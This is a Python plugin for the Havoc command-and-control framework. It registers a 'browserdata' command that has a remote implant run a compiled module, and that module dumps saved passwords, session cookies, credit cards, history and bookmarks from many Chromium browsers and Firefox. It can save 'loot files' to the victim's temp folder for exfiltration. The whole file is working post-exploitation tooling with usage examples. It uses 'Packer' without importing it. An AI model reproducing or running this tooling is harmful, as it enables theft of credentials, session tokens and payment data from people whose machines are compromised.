from havoc import Demon, RegisterCommand


BROWSERDATA_HELP = """browserdata <browser[,browser...]|all> <categories|all> <json|csv> [verbose 0|1] [save 0|1]

    Extracts browser data from Chromium (Chrome/Edge/Brave/Opera/Vivaldi/...) and
    Firefox: passwords, cookies, history, downloads, credit cards, bookmarks.

    browsers   : all | chrome | edge | chromium | brave | opera | opera-gx | vivaldi |
                 coccoc | yandex | 360 | 360x | qq | dc | sogou | arc | duckduckgo | firefox
                 (comma-separated list accepted, e.g. chrome,edge,firefox)
    categories : all | passwords | cookies | history | downloads | creditcards | bookmarks
    verbose    : 0 = readable rows only, 1 = also stream the full JSON/CSV
    save       : 0 = memory only, print to console and write nothing to disk [default]
                 1 = also write one JSON/CSV loot file per browser/profile/category
                     to %TEMP%\\hbd (pull with `download`)

Examples:
    browserdata all all json 0                    # summary, memory only
    browserdata edge passwords json 1             # full output to console, memory only
    browserdata chrome,edge,firefox passwords json 0   # specific browsers only
    browserdata firefox all json 1 1              # full output + write loot files to %TEMP%\\hbd
"""


def browserdata(demonID, *params):
    demon = Demon(demonID)
    packer = Packer()

    browser = "all"
    cats = "all"
    fmt = "json"
    verbose = 0
    save = 0

    if len(params) >= 1:
        browser = params[0]
    if len(params) >= 2:
        cats = params[1]
    if len(params) >= 3:
        fmt = params[2]
    if len(params) >= 4:
        try:
            verbose = int(params[3])
        except ValueError:
            verbose = 0
    if len(params) >= 5:
        try:
            save = int(params[4])
        except ValueError:
            save = 0

    packer.addstr(browser)
    packer.addstr(cats)
    packer.addstr(fmt)
    packer.addint(verbose)
    packer.addint(save)

    mode = "save to %TEMP%\\hbd" if save else "memory only"
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to extract browser data ({browser} / {cats} / {fmt} / {mode})")
    demon.InlineExecute(TaskID, "go",
        f"bin/browserdata.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


RegisterCommand(browserdata, "", "browserdata",
    "Extract browser data (passwords/cookies/history/downloads/creditcards/bookmarks)",
    0, BROWSERDATA_HELP, "browserdata all all json 0")
